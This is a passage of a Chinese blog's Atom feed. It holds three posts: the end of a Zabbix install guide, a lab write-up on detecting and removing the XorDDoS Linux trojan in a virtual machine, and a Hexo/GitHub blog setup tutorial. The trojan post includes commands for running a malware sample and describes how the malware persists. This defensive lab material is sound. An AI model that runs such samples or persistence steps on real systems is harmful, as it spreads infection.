不用管，直接下一步</p><p><img src="/images/pasted-41.png" alt="upload successful"><br><strong>3、输入连接数据库的详细信息。Zabbix数据库必须是已经创建好的。</strong></p><p><img src="/images/pasted-42.png" alt="upload successful"><br><strong>4、输入Zabbix Server的详细信息。</strong></p><p><img src="/images/pasted-43.png" alt="upload successful"><br><strong>5、检查设置信息。</strong></p><p><img src="/images/pasted-44.png" alt="upload successful"><br><strong>6、下载配置文件，将它放置在Web服务器HTML文档子目录（即你复制Zabbix PHP文件的目录）的conf/路径下。</strong><br>cd /var/www/html/zabbix/conf<br>rz<br>使用rz命令上传就可以了</p><p><img src="/images/pasted-45.png" alt="upload successful"></p><p><img src="/images/pasted-46.png" alt="upload successful"></p><p><strong>7、上传完毕后，完成安装。</strong></p><p><img src="/images/pasted-47.png" alt="upload successful"><br><strong>8、Zabbix前端已经就绪！默认的用户名是Admin，密码是zabbix。</strong></p><p><img src="/images/pasted-48.png" alt="upload successful"></p><p><strong>登录后显示界面：</strong></p><p><img src="/images/pasted-49.png" alt="upload successful"></p><p><strong>使用说明参考文档：<a href="https://www.zabbix.com/documentation/3.4/manual/quickstart/login" target="_blank" rel="noopener">https://www.zabbix.com/documentation/3.4/manual/quickstart/login</a></strong></p><h3 id="0x04-【参考文献】"><a href="#0x04-【参考文献】" class="headerlink" title="0x04 【参考文献】"></a>0x04 【参考文献】</h3><p><a href="https://www.zabbix.com/download?zabbix=3.4&amp;os_distribution=centos&amp;os_version=7&amp;db=MySQL" target="_blank" rel="noopener">https://www.zabbix.com/download?zabbix=3.4&amp;os_distribution=centos&amp;os_version=7&amp;db=MySQL</a><br><a href="https://www.cnblogs.com/kowloon/p/7771495.html" target="_blank" rel="noopener">https://www.cnblogs.com/kowloon/p/7771495.html</a><br><a href="http://blog.51cto.com/xpu2001/2052634" target="_blank" rel="noopener">http://blog.51cto.com/xpu2001/2052634</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;【前言】&quot;&gt;&lt;a href=&quot;#【前言】&quot; class=&quot;headerlink&quot; title=&quot;【前言】&quot;&gt;&lt;/a&gt;【前言】&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;zabbix（音同 za:bix）是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。zabbix由2部分构成，zabbix server与可选组件zabbix agent。zabbix server可以通过SNMP，zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视，数据收集等功能，它可以运行在Linux，Solaris，HP-UX，AIX，Free BSD，Open BSD，OS X等平台上。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="安全运维" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="zabbix" scheme="http://yoursite.com/tags/zabbix/"/>
    
      <category term="监控" scheme="http://yoursite.com/tags/%E7%9B%91%E6%8E%A7/"/>
    
  </entry>
  
  <entry>
    <title>记一次XorDDos木马的清除</title>
    <link href="http://yoursite.com/2018/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1XorDDos%E6%9C%A8%E9%A9%AC%E7%9A%84%E6%B8%85%E9%99%A4/"/>
    <id>http://yoursite.com/2018/08/10/记一次XorDDos木马的清除/</id>
    <published>2018-08-10T10:00:00.000Z</published>
    <updated>2018-08-10T11:52:14.466Z</updated>
    
    <content type="html"><![CDATA[<h3 id="【前言】"><a href="#【前言】" class="headerlink" title="【前言】"></a>【前言】</h3><blockquote><p>一种名为“XOR.DDoS”的新型木马出现，该木马能够感染32位和64位的Linux系统，通过安装rootkit来隐藏自身，并可通过DDoS攻击形成僵尸网络。XOR.DDoS木马原理是杀毒软件公司Avast在它们的博客中解释了这种新的威胁，该木马可以根据目标Linux系统环境的不同来相应调整安装方式，并安装一个rootkit来躲避杀毒软件的检测。黑客首先通过SSH暴力登录目标Linux系统，然后尝试获得根用户证书。如果成功，则通过一个shell脚本安装该木马，该shell脚本的功能主要包括：主程序、环境检测、编译、解压、安装等。该木马首先通过受害系统的内核头文件来进行兼容性检测，如果成功匹配则继续安装一个rootkit，以此来隐藏木马自身。</p></blockquote><a id="more"></a><h3 id="0x01-【实现环境】"><a href="#0x01-【实现环境】" class="headerlink" title="0x01 【实现环境】"></a>0x01 【实现环境】</h3><p>CentOS Linux release 7.5.1804 (Core)</p><p><strong>在植入木马之前一定要记得把虚拟机的网络设置成NAT或host-only模式防止病毒传播到本机或造成破坏！</strong></p><h3 id="0x02-【植入木马】"><a href="#0x02-【植入木马】" class="headerlink" title="0x02 【植入木马】"></a>0x02 【植入木马】</h3><p>把XorDDos的病毒样本上传到liunx机器中，进行解压，运行木马文件，执行完之后发现木马自毁了文件，可知是一个并不一般的木马。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">unzip XorDDos样本-密码123.zip </span><br><span class="line">chmod +x a753cb1ff86c742bb497155362664c3b </span><br><span class="line">./a753cb1ff86c742bb497155362664c3b </span><br><span class="line">sh b3c466263551794bb247c68ff1bc357a.sh </span><br><span class="line">./b3c466263551794bb247c68ff1bc357a</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-19.png" alt="upload successful"></p><h3 id="0x03-【杀马全过程】"><a href="#0x03-【杀马全过程】" class="headerlink" title="0x03 【杀马全过程】"></a>0x03 【杀马全过程】</h3><p>1.发现cpu使用超高、网络流量异常、服务器还会出现卡顿现象。<br>通过top发现会有几个可疑的程序占用了CPU。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-20.png" alt="upload successful"></p><p>2.执行tcpdump -i ens33后发现网络的流量异常，不断在往外发送请求。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i ens33</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-21.png" alt="upload successful"><br>3.通过lsof -i 看到了一个可疑的服务，PID为1657。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -i</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-34.png" alt="upload successful"><br>4.尝试着杀掉这个进程 kill -9 1657，发现又起了另一个服务进程，猜测这个木马会不断的改名自启。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -9 1657</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-22.png" alt="upload successful"><br><strong>查杀思路：<br>由于运行进程有多个相互保护（参考一下pstree），而且和病毒文件直接也是相互配合，如果直接删除也会重新生成一个新的病毒文件，所以查杀的基本的思路是：删除定时任务中的病毒启动—&gt;破坏病毒文件使其不可执行（不要删除，否会自动生成）—&gt;停止系统病毒进程—&gt;删除病毒文件—&gt;清理感染文件—&gt;关闭病毒开机启动<br>以下查杀可以自由组合，按上面查杀思路排列即可！</strong></p><p>5.查看木马进程的位置。(proc之后跟的数字文件就是程序的PID)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ll /proc/9257</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-23.png" alt="upload successful"><br>我们还可以尝试使用rkhunter或chkrootkit工具看看有哪些文件被木马篡改过。步骤略。</p><p>6.查看计划任务，没有发现任何任务，可是其他同学会发现，从而可以定位木马的目录在/etc/cron.hourly/<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l   #查看计划任务</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-25.png" alt="upload successful"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ll /etc/cron.hourly/   #发现了木马的执行文件位置</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-26.png" alt="upload successful"></p><p>7.先对木马文件去权 chmod 000 uzsziblfy.sh ，然后查看里面的文件信息。也可以尝试将木马执行文件下载下来进行反编译，不过一定要先对其去权。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/cron.hourly/ccyfuny.sh</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-27.png" alt="upload successful"><br>对其文件去权chmod 000 /usr/bin/ccyfuny</p><p>8.利用ll -aR /etc/rc.d查看木马文件的连接，红色一直在闪烁的是之前删除了的木马。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ll -aR /etc/rc.d</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-28.png" alt="upload successful"><br>对其去权 chmod 000 /etc/init.d/ccyfuny</p><p>9.reboot重启系统,然后查看CPU和开放端口以及进程情况。<br>查看top没有发现可疑程序。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-29.png" alt="upload successful"><br>也没发现可疑的进程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -i</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-30.png" alt="upload successful"><br>也没发现可疑的端口开放<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anlpt</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-31.png" alt="upload successful"></p><p>10.所有文件去完权后，接着清除所有的可疑文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /usr/bin/ccyfuny ccyfuny.sh</span><br><span class="line">rm -rf /etc/cron.hourly/ccyfuny.sh </span><br><span class="line">rm -rf /etc/init.d/ccyfuny</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-32.png" alt="upload successful"><br>11.再reboot重启系统，并没有发现可疑文件了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -anlpt</span><br><span class="line">lsof -i</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-33.png" alt="upload successful"></p><p><strong>总结，先去除所有可疑执行文件的执行权限，然后重启，再删除所有可疑文件，再重启，就大功告成了。</strong></p><h3 id="0x04-【参考文件】"><a href="#0x04-【参考文件】" class="headerlink" title="0x04 【参考文件】"></a>0x04 【参考文件】</h3><p><a href="https://blog.csdn.net/gosenkle/article/details/80220788" target="_blank" rel="noopener">https://blog.csdn.net/gosenkle/article/details/80220788</a><br><a href="https://blog.csdn.net/rigous/article/details/73970391" target="_blank" rel="noopener">https://blog.csdn.net/rigous/article/details/73970391</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;【前言】&quot;&gt;&lt;a href=&quot;#【前言】&quot; class=&quot;headerlink&quot; title=&quot;【前言】&quot;&gt;&lt;/a&gt;【前言】&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;一种名为“XOR.DDoS”的新型木马出现，该木马能够感染32位和64位的Linux系统，通过安装rootkit来隐藏自身，并可通过DDoS攻击形成僵尸网络。XOR.DDoS木马原理是杀毒软件公司Avast在它们的博客中解释了这种新的威胁，该木马可以根据目标Linux系统环境的不同来相应调整安装方式，并安装一个rootkit来躲避杀毒软件的检测。黑客首先通过SSH暴力登录目标Linux系统，然后尝试获得根用户证书。如果成功，则通过一个shell脚本安装该木马，该shell脚本的功能主要包括：主程序、环境检测、编译、解压、安装等。该木马首先通过受害系统的内核头文件来进行兼容性检测，如果成功匹配则继续安装一个rootkit，以此来隐藏木马自身。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="木马查杀" scheme="http://yoursite.com/categories/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80/"/>
    
    
      <category term="木马查杀" scheme="http://yoursite.com/tags/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>Hexo-GitHub搭建静态博客平台(Next主题)</title>
    <link href="http://yoursite.com/2018/08/09/Hexo-GitHub%E6%90%AD%E5%BB%BA%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%E5%B9%B3%E5%8F%B0-Next%E4%B8%BB%E9%A2%98/"/>
    <id>http://yoursite.com/2018/08/09/Hexo-GitHub搭建静态博客平台-Next主题/</id>
    <published>2018-08-09T13:23:00.000Z</published>
    <updated>2018-08-13T13:51:24.694Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>gitHub是一个面向<a href="https://baike.baidu.com/item/%E5%BC%80%E6%BA%90/20720669" target="_blank" rel="noopener">开源</a>及私有<a href="https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6/12053" target="_blank" rel="noopener">软件</a>项目的托管平台，因为只支持git 作为唯一的版本库格式进行托管，故名gitHub。 Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 <a href="http://daringfireball.net/projects/markdown/" target="_blank" rel="noopener">Markdown</a>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 </p></blockquote><a id="more"></a> <h3 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h3><h4 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h4><p>我的域名：<a href="http://www.dizai.tech，主要是提升自我逼格，不愿意花钱就跳过此步骤。" target="_blank" rel="noopener">www.dizai.tech，主要是提升自我逼格，不愿意花钱就跳过此步骤。</a><br>国内可以去阿里云或腾讯云购买域名，价格也很便宜。</p><h4 id="环境技术"><a href="#环境技术" class="headerlink" title="环境技术"></a>环境技术</h4><p>前往github官网<a href="https://github.com" target="_blank" rel="noopener">https://github.com</a> 注册一个github账号。<br> <a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">Hexo</a> 的安装前提就是得有 Node.js 和 Git 。</p><p> 这里，我们要区分清楚git与github。git是一个版本控制的工具，而github有点类似于远程仓库，用于存放用git管理的各种项目。<br> 下面提供相关的官方版本地址，安装教程去网上搜一下就很多。</p><ul><li><p>Node 官方版本安装：<a href="https://nodejs.org/en/" target="_blank" rel="noopener">https://nodejs.org/en/</a> </p></li><li><p>Git 官方版本安装：<a href="https://git-scm.com/download/win" target="_blank" rel="noopener">https://git-scm.com/download/win</a> </p></li><li><p>我用到软件版本（你们可以在官方下载最新版的）</p><p>Git：Git-2.18.0-64-bit </p><p>Node：node-v10.7.0-x64 </p><p>验证安装：任何位置鼠标右击出现Git Bash Here</p><p>cmd下</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-0.png" alt="upload successful"></p><p>验证安装：cmd下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-1.png" alt="upload successful"></p><h3 id="0x02-Github-配置"><a href="#0x02-Github-配置" class="headerlink" title="0x02 Github 配置"></a>0x02 Github 配置</h3><h4 id="创建仓库-new-repository"><a href="#创建仓库-new-repository" class="headerlink" title="创建仓库 new repository"></a>创建仓库 new repository</h4><p>在自己的GitHub账号下创建一个新的仓库，命名为username.github.io（username 是你的账号名)。</p><p>在这里，要知道，GitHub Pages有两种类型：User/Organization Pages 和 Project Pages，而我所使用的是User Pages。<br> 简单来说，User Pages 与 Project Pages的区别是：</p><ol><li>User Pages 是用来展示用户的，而 Project Pages 是用来展示项目的。</li><li>用于存放 User Pages 的仓库必须使用username.github.io的命名规则，而 Project Pages 则没有特殊的要求。</li><li>User Pages 将使用仓库的 master 分支，而 Project Pages 将使用 gh-pages 分支。</li><li>User Pages 通过 http(s):<a href="http://username.github.io" target="_blank" rel="noopener">//username.github.io</a> 进行访问，而 Projects Pages通过 http(s):<a href="http://username.github.io/projectname" target="_blank" rel="noopener">//username.github.io/projectname</a> 进行访问。</li></ol><p>另外注意：</p><ul><li>注册的邮箱一定要验证，否则不会成功；</li><li>仓库名字必须是：username.github.io，其中username是你的用户名；</li><li>仓库创建成功不会立即生效，需要过一段时间，大概10-30分钟，或者更久，我的等了半个小时才生效；<br><img src="/images/pasted-2.png" alt="upload successful"></li></ul><h3 id="0x03-配置SSH-key"><a href="#0x03-配置SSH-key" class="headerlink" title="0x03 配置SSH key"></a>0x03 配置SSH key</h3><p><strong>用于本地与github数据交换生成并配置key</strong><br>执行如下命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;liuxianan&quot;#你的github用户名</span><br><span class="line">git config --global user.email  &quot;xxx@qq.com&quot;#填写你的github注册邮箱</span><br></pre></td></tr></table></figure></p><p>生成ssh密钥<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/. ssh#检查本机已存在的ssh密钥</span><br><span class="line">ssh-keygen -t rsa -C &quot;邮件地址&quot;#生成密钥</span><br></pre></td></tr></table></figure></p><p>连续按回车三次（使用默认ssh密钥生成策略），密钥生成成功，存于本地用户目录(~)，打开.ssh\id_rsa.pub文件，并复制其中内容</p><p>打开你的github主页，进入个人设置-&gt; SSH and GPG keys -&gt; New SSH key：</p><p>title任意填写，将内容复制到key中即可</p><p><strong>测试ssh</strong><br>本地执行</p><p>ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>         #注意邮箱地址不用改<br>如果提示Are you sure you want to continue connecting (yes/no)?，输入yes，然后会看到：</p><p>Hi xxx! You’ve successfully authenticated, but GitHub does not provide shell access.</p><p>看到这个信息说明SSH已配置成功！</p><h3 id="0x04-安装hexo"><a href="#0x04-安装hexo" class="headerlink" title="0x04 安装hexo"></a>0x04 安装hexo</h3><p><strong>以下命令都是在git命令行中实现</strong></p><p>首先在本地磁盘中建立一个Hexo文件夹用于存储本地文件(做本地文件保存以及测试使用)<br><img src="/images/pasted-3.png" alt="upload successful"><br>然后在文件夹中右击打开git命令框(我第一次直接在桌面右击，所以命令行无效果) </p><p><img src="/images/pasted-4.png" alt="upload successful"></p><p>在git命令框中安装Hexo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-5.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-6.png" alt="upload successful"><br> 此目录会自动生成hexo相关文件</p><p> 注：此处目录中会存在一个_config.yml的文件，为hexo的主配置文件，以后我们称其为站点配置文件。<br><img src="/images/pasted-7.png" alt="upload successful"></p><h4 id="本地预览"><a href="#本地预览" class="headerlink" title="本地预览"></a>本地预览</h4><p> hexo目录中执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean  #清除缓存</span><br><span class="line">hexo g#生成静态页面</span><br><span class="line">hexo s#启动本地预览服务</span><br></pre></td></tr></table></figure></p><p> 执行命令后，hexo会在public文件夹生成相关html文件，用于本地预览与后期提交github</p><p> 浏览器访问[<a href="http://127.0.0.1:4000或localhost:4000，即可看到hexo默认生成页面hello,world]" target="_blank" rel="noopener">http://127.0.0.1:4000或localhost:4000，即可看到hexo默认生成页面hello,world]</a></p><p><img src="/images/pasted-8.png" alt="upload successful"></p><h3 id="0x05-写博客"><a href="#0x05-写博客" class="headerlink" title="0x05 写博客"></a>0x05 写博客</h3><p>进入hexo根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new &apos;my-first-blog&apos;</span><br></pre></td></tr></table></figure><p>‘ ‘中为你本篇博客的名称，执行完成后，会自动在\hexo\source_posts\目录下生成.md文件，</p><p>只要打开这个文件就可以写博客了。（.md的文件必须用支持markdown的编辑器）</p><h3 id="0x06-上传到github"><a href="#0x06-上传到github" class="headerlink" title="0x06 上传到github"></a>0x06 上传到github</h3><h4 id="上传前的配置"><a href="#上传前的配置" class="headerlink" title="上传前的配置"></a>上传前的配置</h4><p>配置站点配置文件_config.yml中的deploy部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:yourname/yourname.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><h4 id="安装上传插件"><a href="#安装上传插件" class="headerlink" title="安装上传插件"></a>安装上传插件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><h4 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h4><p>在hexo根目录下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>会将有所改动的内容全部提交至github</p><h4 id="常用hexo命令"><a href="#常用hexo命令" class="headerlink" title="常用hexo命令"></a>常用hexo命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;postName&quot;   #新建文章</span><br><span class="line">hexo new page &quot;pageName&quot;   #新建页面</span><br><span class="line">hexo generate   #生成静态页面至public目录</span><br><span class="line">hexo server   #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）</span><br><span class="line">hexo deploy   #部署到GitHub</span><br><span class="line">hexo help   #查看帮助</span><br><span class="line">hexo version   #查看Hexo的版本</span><br><span class="line">hexo clean   #清除缓存</span><br><span class="line"></span><br><span class="line">缩写：</span><br><span class="line">hexo n == hexo new</span><br><span class="line">hexo g == hexo generate</span><br><span class="line">hexo s == hexo server</span><br><span class="line">hexo d == hexo deploy</span><br><span class="line"></span><br><span class="line">组合命令：</span><br><span class="line">hexo s -g#生成并本地预览</span><br><span class="line">hexo d -g#生成并上传</span><br></pre></td></tr></table></figure><h3 id="0x07-更改默认hexo主题及优化"><a href="#0x07-更改默认hexo主题及优化" class="headerlink" title="0x07 更改默认hexo主题及优化"></a>0x07 更改默认hexo主题及优化</h3><h4 id="主题下载"><a href="#主题下载" class="headerlink" title="主题下载"></a>主题下载</h4><p>进入hexo根目录</p><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure><p>执行完成后会在hexo\themes\ 目录下生成next目录</p><p>next目录下也会存在一个_config.yml文件，这是next主题的主配置文件，以后我们称为主题配置文件</p><p>你也可以自己更换自己喜欢的主题<a href="https://hexo.io/themes/" target="_blank" rel="noopener">https://hexo.io/themes/</a> ，官网有很多主题，</p><h4 id="主题应用"><a href="#主题应用" class="headerlink" title="主题应用"></a>主题应用</h4><p>配置站点配置文件</p><p>寻找theme字段，将其值修改为next（next前都有一个空格，否则会报错）</p><h4 id="主题预览"><a href="#主题预览" class="headerlink" title="主题预览"></a>主题预览</h4><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean#清除缓存</span><br><span class="line">hexo g#重新生成代码</span><br><span class="line">hexo s#部署到本地</span><br></pre></td></tr></table></figure><p>浏览器访问 <a href="http://127.0.0.1:4000/" target="_blank" rel="noopener">http://127.0.0.1:4000</a> 查看效果</p><h3 id="0x08-主题简单优化"><a href="#0x08-主题简单优化" class="headerlink" title="0x08 主题简单优化"></a>0x08 主题简单优化</h3><h4 id="设置布局"><a href="#设置布局" class="headerlink" title="设置布局"></a>设置布局</h4><p>主题配置文件中</p><p>寻找 Scheme 字段，next提供三种默认主题布局，将你想使用的布局取消注释即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#scheme: Muse</span><br><span class="line">#scheme: Mist</span><br><span class="line">scheme: Pisces</span><br></pre></td></tr></table></figure><ul><li>Muse - 默认 Scheme，这是 NexT 最初的版本，黑白主调，大量留白</li><li>Mist - Muse 的紧凑版本，整洁有序的单栏外观</li><li>Pisces - 双栏 Scheme，小家碧玉似的清新</li></ul><h4 id="设置显示语言"><a href="#设置显示语言" class="headerlink" title="设置显示语言"></a>设置显示语言</h4><p>站点配置文件中</p><p>寻找<code>language</code> 字段，设置其值为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">language: zh-Hans</span><br></pre></td></tr></table></figure><p>语言文件位于hexo\themes\next\languages目录下</p><h4 id="设置菜单"><a href="#设置菜单" class="headerlink" title="设置菜单"></a>设置菜单</h4><p>主题配置文件中</p><p>寻找menu字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: / || home     #主页</span><br><span class="line">  categories: /categories/ || th  #分类页</span><br><span class="line">  tags: /tags/ || tags     #标签页</span><br><span class="line">  about: /about/ || user     #关于页</span><br><span class="line">  #archives: /archives/ || archive  #归档页</span><br><span class="line">  #schedule: /schedule/ || calendar</span><br><span class="line">  #sitemap: /sitemap.xml || sitemap</span><br><span class="line">  #commonweal: /404/ || heartbeat     #公益404</span><br></pre></td></tr></table></figure><p>除主页与归档页外，其余页面需要手动创建</p><p>每行中 || 后的内容为指定此menu的图标</p><h4 id="添加标签页"><a href="#添加标签页" class="headerlink" title="添加标签页"></a>添加标签页</h4><p><strong>新建页面</strong></p><p>进入hexo根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page tags</span><br></pre></td></tr></table></figure><p>命令执行后，hexo\source\tags目录中生成index.md文件</p><p><strong>设置页面类型</strong></p><p>修改此index.md文件为(添加type行)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">title: tags</span><br><span class="line">date: 2016-11-15 19:10:05</span><br><span class="line">type: &quot;tags&quot;</span><br></pre></td></tr></table></figure><p><strong>设置具体博客文章tags</strong></p><p>对于hexo\source_post目录下具体博客文章设置tags(设置tags行)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">title: 基于Hexo和Github搭建博客</span><br><span class="line">date: 2016-11-09</span><br><span class="line">tags: [npm, hexo, github]</span><br></pre></td></tr></table></figure><h4 id="添加分类页面"><a href="#添加分类页面" class="headerlink" title="添加分类页面"></a>添加分类页面</h4><p><strong>新建页面</strong></p><p>进入hexo根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure><p>命令执行后，hexo\source\categories目录中生成index.md文件</p><p><strong>设置页面类型</strong></p><p>修改此index.md文件为(添加categories行)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">title: categories</span><br><span class="line">date: 2016-11-15 19:11:13</span><br><span class="line">type: &quot;categories&quot;</span><br></pre></td></tr></table></figure><p><strong>设置具体博客文章categories</strong></p><p>对于hexo\source_post目录下具体博客文章设置categories(设置categories行)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">title: 基于Hexo和Github搭建博客</span><br><span class="line">date: 2016-11-09</span><br><span class="line">tags: [npm, hexo, github]</span><br><span class="line">categories: 搭建博客</span><br></pre></td></tr></table></figure><h4 id="添加关于页面"><a href="#添加关于页面" class="headerlink" title="添加关于页面"></a>添加关于页面</h4><p><strong>添加页面</strong></p><p>进入hexo根目录</p><figure class="highlight plain"><table><tr><td 